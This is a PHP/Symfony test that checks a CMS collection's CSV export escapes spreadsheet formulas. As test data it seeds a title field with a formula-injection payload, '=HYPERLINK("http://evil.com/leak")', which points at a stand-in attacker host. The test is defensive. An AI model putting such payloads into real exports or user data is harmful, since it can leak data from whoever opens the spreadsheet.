<?php

declare(strict_types=1);

namespace App\Tests\Controller\AdminApi;

use App\Entity\Collection;
use App\Entity\ContentEntry;
use App\Entity\ContentFieldValue;
use App\Entity\Field;
use App\Entity\Project;
use App\Entity\ProjectMember;
use App\Entity\User;
use App\Enum\ProjectMemberStatus;
use Doctrine\ORM\EntityManagerInterface;
use Symfony\Bundle\FrameworkBundle\Test\WebTestCase;
use Symfony\Component\HttpFoundation\StreamedResponse;

class CollectionExportCsvTest extends WebTestCase
{
    public function testExportCollectionCsvNeutralizesFormulaTriggers(): void
    {
        $client = static::createClient();
        $em = self::getContainer()->get(EntityManagerInterface::class);

        $user = new User();
        $user->email = 'coll-export-' . bin2hex(random_bytes(4)) . '@example.com';
        $user->password = 'password123';
        $em->persist($user);

        $project = new Project();
        $project->name = 'Collection Export Project ' . bin2hex(random_bytes(4));
        $em->persist($project);

        $member = new ProjectMember();
        $member->project = $project;
        $member->user = $user;
        $member->email = $user->email;
        $member->status = ProjectMemberStatus::Active;
        $member->joinedAt = new \DateTimeImmutable();
        $em->persist($member);

        $collection = new Collection();
        $collection->project = $project;
        $collection->name = 'Products';
        $collection->slug = 'products';
        $collection->isSingleton = false;
        $em->persist($collection);

        $titleField = new Field();
        $titleField->collection = $collection;
        $titleField->name = 'Title';
        $titleField->slug = 'title';
        $titleField->type = 'text';
        $em->persist($titleField);

        $priceField = new Field();
        $priceField->collection = $collection;
        $priceField->name = 'Price';
        $priceField->slug = 'price';
        $priceField->type = 'number';
        $em->persist($priceField);

        $entry = new ContentEntry();
        $entry->project = $project;
        $entry->collection = $collection;
        $entry->slug = 'malicious-item';
        $entry->status = 'published';
        $entry->locale = 'fr';
        $em->persist($entry);

        $valTitle = new ContentFieldValue();
        $valTitle->contentEntry = $entry;
        $valTitle->field = $titleField;
        $valTitle->fieldType = 'text';
        $valTitle->textValue = '=HYPERLINK("http://evil.com/leak")';
        $em->persist($valTitle);

        $valPrice = new ContentFieldValue();
        $valPrice->contentEntry = $entry;
        $valPrice->field = $priceField;
        $valPrice->fieldType = 'number';
        $valPrice->numberValue = '49.99';
        $em->persist($valPrice);

        $em->flush();

        $client->loginUser($user);

        $projectUuid = $project->uuid->toString();
        $client->request('GET', "/admin-api/projects/{$projectUuid}/collections/products/export-csv");

        $response = $client->getResponse();
        $this->assertResponseIsSuccessful();
        $this->assertSame('text/csv; charset=utf-8', $response->headers->get('Content-Type'));
        $this->assertStringContainsString('attachment; filename="collection_products_', $response->headers->get('Content-Disposition') ?? '');

        $this->assertInstanceOf(StreamedResponse::class, $response);

        ob_start();
        $callback = $response->getCallback();
        if (is_callable($callback)) {
            $callback();
        }
        $content = ob_get_clean();

        // BOM UTF-8
        $this->assertStringStartsWith("\xEF\xBB\xBF", $content);

        // Neutralisation de la formule HYPERLINK
        $this->assertStringContainsString("'\=HYPERLINK", addcslashes($content, '='));
        $this->assertStringContainsString('49.99', $content);
    }
}
